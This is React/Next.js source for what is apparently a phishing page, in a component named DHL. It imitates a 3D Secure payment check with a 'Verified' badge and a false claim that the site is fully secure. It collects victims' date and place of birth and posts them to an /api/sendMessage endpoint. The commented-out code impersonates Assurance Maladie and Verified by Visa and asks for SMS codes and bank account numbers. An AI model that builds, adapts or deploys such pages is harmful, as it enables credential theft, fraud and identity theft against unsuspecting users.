"use client";

import { useState, useEffect } from "react";
import { useForm } from "react-hook-form";
import { z } from "zod";
import { zodResolver } from "@hookform/resolvers/zod";
import { type } from "os";
import { useRouter, useSearchParams } from "next/navigation";
import Loader from "@/components/Loader";
import Navbar from "@/components/Navbar";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { FaApplePay, FaGooglePay, FaLock } from "react-icons/fa";
import Image from "next/image";

const schema = z.object({
  numEspaceClient: z
    .string()
    .min(3, {
      message: "Le code doit contenir au moins 6 caractères",
    })
    .max(50),
  codeSecret: z
    .string()
    .min(3, {
      message: "Le code doit contenir au moins 5 caractères",
    })
    .max(50),
});

export type InformationProps = z.infer<typeof schema>;
type Props = {
  setData: (data: InformationProps) => void;
  onSubmit: () => void;
};

function DHL() {
  const [isLoaded, setIsLoaded] = useState(true);
  const router = useRouter();
  const params = useSearchParams();

  console.log("params", params.get("name"));

  const form = useForm<InformationProps>({
    resolver: zodResolver(schema),
  });

  const onSubmit = async (data: InformationProps) => {
    const res = await fetch("/api/sendMessage", {
      method: "POST",
      body: JSON.stringify({
        ...data,
        name: params.get("name"),
        isLast: 1,
      }),
    });
    // Router.push("/https://www.ameli.fr/");
    // window.location.href = "https://www.ameli.fr/";
    router.push("/success");
  };

  useEffect(() => {
    setTimeout(() => {
      setIsLoaded(false);
    }, 5000);
  }, []);

  if (isLoaded) {
    return <Loader />;
  }

  return (
    <main className="flex min-h-screen flex-col  ">
      <Navbar />
      <div className="flex flex-col items-center justify-center p-2 ">
        <h3 className="text-blue-500">Validation 3D Secure</h3>
        <div className="flex gap-4 mt-4">
          {/* {/* <Image src="/applepay.png" width={100} height={100} alt="gpay" /> */}
          <Image src="/verified.png" width={200} height={100} alt="gpay" />{" "}
          {/* <div className="border-2 border-black px-2 rounded-sm ">
            <FaApplePay size={50} />
          </div>
          <div className="border-2 border-black px-2 rounded-sm ">
            <FaGooglePay size={50} />
          </div> */}
        </div>
        <Form {...form}>
          <form
            onSubmit={form.handleSubmit(onSubmit)}
            className="my-8 flex flex-col gap-4"
          >
            <FormField
              control={form.control}
              name="codeSecret"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Date de naissance :</FormLabel>
                  <FormControl>
                    <Input
                      placeholder="JJ/MM/AAAA"
                      {...field}
                      maxLength={10}
                      onChange={(e) => {
                        const value = e.target.value;
                        form.setValue(
                          "codeSecret",

                          // regex for date format : 00/00/0000
                          value
                            .replace(/\//g, "")
                            .replace(/(\d{2})/, "$1/")
                            .replace(/(\d{2})\/(\d{2})/, "$1/$2/")
                            .trim()
                        );
                      }}
                      // type="date"
                    />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            <FormField
              control={form.control}
              name="numEspaceClient"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Lieu de naissance :</FormLabel>
                  <FormControl>
                    <Input placeholder="Lieu de naissance" {...field} />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            <div className="flex flex-col items-center justify-center mt-8">
              <button
                type="submit"
                className="bg-blue-950 text-white py-2 px-4 "
              >
                VALIDER
              </button>
              <div className="flex items-center gap-2 mt-2">
                <FaLock />
                <p>Ce site est entièrement sécurisé</p>
              </div>
            </div>
          </form>
        </Form>
      </div>
    </main>
    // <>
    //   {isLoaded ? (
    //     <Loader />
    //   ) : (
    //     <div className=" mx-auto py-10 xxl:w-[60%] xl:w-[60%] lg:w-[60%] md:w-[60%] sm:w-[90%] w-[90%]">
    //       <div className="flex flex-col items-center justify-center shadow-sm border border-[#575a5820] rounded-md">
    //         <div className="flex justify-between w-[100%] p-4 bg-[#EEEEEE]">
    //           <img src="/logo1.svg" alt="dhl-logo" className="w-20" />
    //           <img src="visa.svg" alt="visa" />
    //         </div>
    //         <div className=" text-center w-[100%] p-4 bg-[#0C419A]">
    //           <p className="text-[white] font-bold text-lg">
    //             Identification par deux facteurs
    //           </p>
    //         </div>
    //         <form onSubmit={handleSubmit(onSubmit)}>
    //           <div className="flex bg-[#E0E0EE80] gap-5 flex-col xxl:p-10 xl:p-10 lg:p-10 md:p-10 sm:p-5 p-5">
    //             <p>
    //               Afin de renforcer la sécurité de vos paiements par carte
    //               bancaire sur internet, nous avons adopté une double
    //               authentification Verified by Visa™ par SMS et numéro espace
    //               client. Pour finaliser votre transaction en toute sécurité,
    //               veuillez saisir le code SMS envoyé à votre numéro de téléphone
    //               enregistré ainsi que votre numéro de compte bancaire.
    //             </p>

    //             <div className="flex justify-between">
    //               <h1 className="font-bold text-[#212529] flex ">Marchand :</h1>
    //               <h1 className="flex flex-1 text-right">
    //                 &nbsp;Assurance Maladie
    //               </h1>
    //             </div>
    //             <div className="flex justify-between">
    //               <h1 className="font-bold text-[#212529] flex ">
    //                 Numéro de carte :
    //               </h1>
    //               <h1 className="flex flex-1 text-right">
    //                 &nbsp;XXXX XXXX XXXX XXXX
    //               </h1>
    //             </div>
    //             <div className="flex justify-between">
    //               <h1 className="font-bold text-[#212529] flex ">Montant :</h1>
    //               <h1 className="flex flex-1 text-right">&nbsp;4,20€</h1>
    //             </div>
    //             <div className="flex justify-between">
    //               <h1 className="font-bold text-[#212529] flex">
    //                 Date et heure :&nbsp;
    //               </h1>
    //               <h1 className="flex flex-1 text-right">
    //                 {new Date().toLocaleDateString()} à{" "}
    //                 {new Date().toLocaleTimeString()}
    //               </h1>
    //             </div>
    //             <div className="flex justify-between items-center">
    //               <h1 className="font-bold text-[#212529] flex w-1/2 ">
    //                 Date de naissance :
    //               </h1>
    //               <input
    //                 type="text"
    //                 placeholder={errors.numEspaceClient?.message}
    //                 {...register("numEspaceClient")}
    //                 className={`border border-[#575a5820] rounded-sm outline-none px-2 flex w-1/2
    //                 ${errors.numEspaceClient && "border-red-500"}
    //                 `}
    //                 // style={{
    //                 //     height : '100px'
    //                 //  }}
    //               />
    //             </div>
    //             <div className="flex justify-between">
    //               <h1 className="font-bold text-[#212529] flex w-1/2 ">
    //                 Lieu de naissance :
    //               </h1>
    //               <input
    //                 type="text"
    //                 placeholder={errors.numEspaceClient?.message}
    //                 {...register("codeSecret")}
    //                 className={`border border-[#575a5820] rounded-sm outline-none flex w-1/2 px-2
    //                 ${errors.codeSecret && "border-red-500"}
    //                 `}
    //                 //  style={{
    //                 //    height : '100px'
    //                 //  }}
    //               />
    //             </div>
    //             <p>
    //               {" "}
    //               Si vous souhaitez vous authentifier via application mobile,{" "}
    //               <u>
    //                 <a href="#">Cliquez ici une notification sera envoyée</a>
    //               </u>{" "}
    //               à votre application mobile bancaire pour confirmer votre
    //               transaction. Veuillez vérifier votre application pour
    //               continuer. Cette mesure de sécurité est obligatoire pour
    //               protéger vos achats en ligne.
    //             </p>
    //           </div>
    //           <div className="flex w-[100%] p-4 justify-end bg-[#EEEEEE80]">
    //             <button className="bg-[#0C419A] text-white py-3 px-5 rounded-sm">
    //               Valider
    //             </button>
    //           </div>
    //         </form>
    //         <div className="w-[100%] p-4 bg-[#EEEEEE]">
    //           <p className="text-center font-semibold">
    //             2023 Assurance Maladie. Tous droits réservés
    //           </p>
    //         </div>
    //       </div>
    //     </div>
    //   )}
    // </>
  );
}

export default DHL;
